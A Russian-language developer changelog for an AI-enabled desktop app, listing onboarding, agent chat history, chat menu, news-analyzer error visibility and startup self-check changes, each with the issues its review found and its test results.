Онбординг имел шаг «AI», но только ПРОВЕРЯЛ связь — задать эндпоинт было негде (ST-A3); новый юзер уходил в Настройки. Теперь прямо в шаге: поля chat/embedding URL (предзаполнены дефолтами `.28` — заодно закрывает «дефолтные эндпоинты» из W-11) + «Сохранить и проверить» (`set_ai_config`→`test_ai_connection`, пилюля здоровья).

- **frontend** (`onboarding/Onboarding.tsx`): сохраняет существующие `ai.fast` и модели (иначе `set_ai_config` стёр бы `ai.fast` — data-loss, фикс ревью); предзаполнение ОДИН раз (re-entry не затирает правки); смена embedding → подсказка о перезапуске/переиндексации (`embeddingChanged`, как в Настройках).
- Adversarial-ревью (3 измерения × verify, 12 находок / 3 подтверждено — все исправлены: ai.fast data-loss + restart-подсказка + prefill-guard). Гейт: typecheck / eslint / vitest 960 (Onboarding +4 теста).
...
- **core** (`agent/session.rs`): `SessionSpec.history: Vec<ChatMessage>` — вставка МЕЖДУ меню скиллов и текущей задачей. Пусто (agentd/scheduler/subagent/первый ход) → без регрессии.
- **desktop** (`commands/agent.rs`): `agent_run`/`drive_run` принимают `history: Vec<HistoryMsg{role,text}>` → `ChatMessage` (assistant/user), пустые пропускаются.
- **frontend** (`stores/agent.ts` + `tauri-api.ts`): стор строит историю из `turns[]` и шлёт в `agent.run`. Защиты (ревью): строгая альтернация ролей (errored/cancelled ход → плейсхолдер-assistant), кап по ходам (8) И символам (12k, усечение одного сообщения 4k) — огромный отчёт иначе раздул бы контекст и завалил прогон.
- История — переписка самого пользователя → НЕ фенсится (в отличие от recall/skill-menu): фенсить собственный диалог было бы неверно.
- Adversarial-ревью (3 измерения × verify, 8 находок / 0 подтверждено; применены 2 defense-in-depth: бюджет истории + альтернация). Гейт: clippy workspace / `cargo test` core-agent 215 + desktop 190 / typecheck / eslint / vitest 951 (core history-threading + 4 store-теста).

### Чат · W-5 — действия ответа в подменю «⋯» 🔴 BETA

Репорт владельца: действия под ответом (Копировать/Вставить/В память/Перегенерировать) «висят в ряд», просил убрать в подменю; + «вёрстка чата поехала».

- **frontend** (`chat/ChatView.tsx`): `MessageActions` — одна кнопка-кебаб «⋯», по клику выпадающее меню (role=menu/menuitem) с теми же действиями (Перегенерировать — только у последнего ответа). Click-outside + Escape.
- **меню — ПОРТАЛ у `document.body`** (fixed-позиция, флип вверх при нехватке места снизу, закрытие на скролл/ресайз): лента `overflow:auto` + строки виртуализатора имеют `transform` (свой stacking-context), поэтому абсолютное меню внутри строки ОБРЕЗАЛОСЬ бы лентой и рисовалось под следующим сообщением (3 major из ревью — портал обходит и clip, и stacking). `:focus-visible`-кольцо на кебабе.
- Adversarial-ревью (3 измерения × verify, 10 находок / 4 подтверждено — все исправлены: clip×2 + stacking + focus-ring). Гейт: typecheck / eslint / vitest 947-0 (ChatView 29, тест портала+меню).

### Новости · W-2 — видимость недоступного анализатора (прозрачность загрузки) 🔴 BETA

Репорт владельца: «новости не грузятся; в логах LLM бьётся в мёртвый .31». Диагностика (мультиагент): мёртвый эндпоинт оценки = МОЛЧАЛИВЫЙ провал — джоба возвращает Ok (не в dead-jobs), статьи фетчатся, но НЕ сохраняются (только оценённые строки идут в `insert_items`), `itemsNew=0` → пустой экран без причины. (Дрейф `.31` — конфиг пользователя; теперь его ловит W-21 self-check; SA-Vault уже на `.28`.)

- **backend** (`news/llm.rs`): `EvalReport.batch_errors` — отдельный счётчик СБОЕВ ВЫЗОВА (эндпоинт недоступен), не парс-фейлов отдельных записей (чтобы баннер не загорался на паре кривых JSON при живом эндпоинте).
- **backend** (`news/run.rs`): при `batch_errors>0` — ОДНА строка в `errors[]`, называющая эндпоинт; двухуровнево (`llm_unavailable_msg`, после `insert_items`): `itemsNew==0` → «Анализатор недоступен … лента не обновится» (тотально); `itemsNew>0` → «частично недоступен … остальные новости добавлены» (не врём про тотальный провал — ревью W-2). `NewsFeedHandler.chat_endpoint` = ai.fast→ai.chat url. Прогон остаётся `Ok` (DB save/record_run проходят); неоценённые url повторятся на следующем прогоне.
- **frontend** (`news/NewsView.tsx`): красный баннер при наличии тотальной строки (независимо от items) + пустая лента при недоступном анализаторе → состояние ОШИБКИ (с «Повторить»), а не благостное «Свежих новостей нет» (ревью W-2: иначе противоречие баннеру).
- Adversarial-ревью (3 измерения × verify, 11 находок / 2 подтверждено — обе исправлены в срезе: двухуровневая формулировка + согласованное пустое состояние). Гейт: fmt/clippy -D warnings/`cargo test` 190-0 (+2 news) / typecheck / eslint / vitest 947-0 (+3 NewsView). Persist-fallback (сохранять сырые заголовки) отложен в BACKLOG (ломал бы переоценку из-за url-дедупа).
...
- **store** (`stores/workspace.ts`): новый `closeGroup(groupId)` — убирает пейн, никогда не закрывает последний; флашит осиротевшие буферы ПЕРЕД GC (SAFE-4, как closeTab); перецеливает `navHistory` закрытой группы на активную; **realign `navIndex`** на запись реально активного пути (инвариант `navHistory[navIndex].path === activePath`); фолбэк активной группы — первая НЕПУСТАЯ из оставшихся (не пустой `groups[0]`).
- **UI** (`workspace/GroupPane.tsx`): крестик `PanelRightClose` в tabTools, виден только при `groups.length>1`.
- Adversarial-ревью (3 измерения × verify, 6 находок / 2 подтверждено): обе подтверждённые (navIndex-десинк major + фолбэк на пустой пейн minor) исправлены и закрыты регресс-тестами в этом же срезе.
- Гейт: typecheck / eslint / vitest 944-0 (+5 closeGroup-тестов в workspace, +2 UI в GroupPane).

### Dev · W-21 — self-check при старте (пинг LLM + активный конфиг) 🔴 BETA (анти-рецидив)

После кризиса 2026-06-24: дрейф эндпоинтов (конфиг бил в мёртвый `.31` вместо `.28`) проявлялся через молча сломанную фичу (новости/чат). W-21 показывает это СРАЗУ при старте — плавающая карточка слева снизу (только dev-сборка, `import.meta.env.DEV`).

- **frontend** (`components/chrome/SelfCheck.tsx`): на монтировании и при смене vault читает `settings.getAiConfig` и пингует chat/embedding/fast через `settings.testConnection` (GET `/v1/models`, GuardedClient `Probe`). Per-эндпоинт ✓/✗/— + URL/модель; ошибка достижимости текстом. `fast` не задан = нейтрально (падает на chat). Проблемная карточка визуально заметнее (тёплая шапка).
- **реюз** существующих Rust-команд (`get_ai_config`/`test_ai_connection`) — нового бэкенда нет.
- Adversarial-ревью (3 измерения × verify, 10 находок / 0 подтверждено): по итогам добавлены latest-wins-guard для конкурентных прогонов, перепроверка при смене vault, live-перевод лейблов без ре-пинга, заметнее проблемное состояние. Валидация модели (а не только достижимости) — в BACKLOG.
- Гейт: typecheck / eslint / vitest 5-0 (SelfCheck) + полный прогон 936-0.
...
- **`stores/agent.ts`**: `turns: AgentTurn[]` вместо одиночной рендер-модели; `run()` дописывает ход; события стрима адресуются СВОЕМУ ходу по **epoch-токену** (монотонный, НЕ сбрасывается newSession) — закрывает окно «late-события прошлого прогона текут в новый» (до прихода backend-runId и при реюзе key). Отменённый ход НЕ воскрешается поздним final/error (уважаем cancel). `sessionStatus()` хелпер. approve/pause/resume/cancel/undo/file-decisions адресуют активный (последний) ход.
- **`AgentView.tsx`**: рендер ленты ходов через новый компонент `TurnView` (task + ответ + tool-шаги + changeset + контролы); аппрув/контролы интерактивны только у последнего хода.

**Проверено в ЗАПУЩЕННОМ приложении** (preview NEXUS-sbx): отправил 2 сообщения подряд — оба хода остаются в ленте (скриншот; старый билд стирал). Adversarial-ревью (скептик-агент): 0 новых регрессий, 2 МИНОРНЫХ предсуществующих утечки событий — **обе закрыты в срезе** (epoch-гард + не-воскрешать-cancel). tsc/eslint/build чисто, vitest 931 (+регрессионный тест «2-е сообщение не стирает 1-е»). Урок процесса: [[feedback_verify_e2e_not_just_units]]. Дальше AGENT-0.2 (web/skills в десктоп-`agent_run` — сейчас `None`).
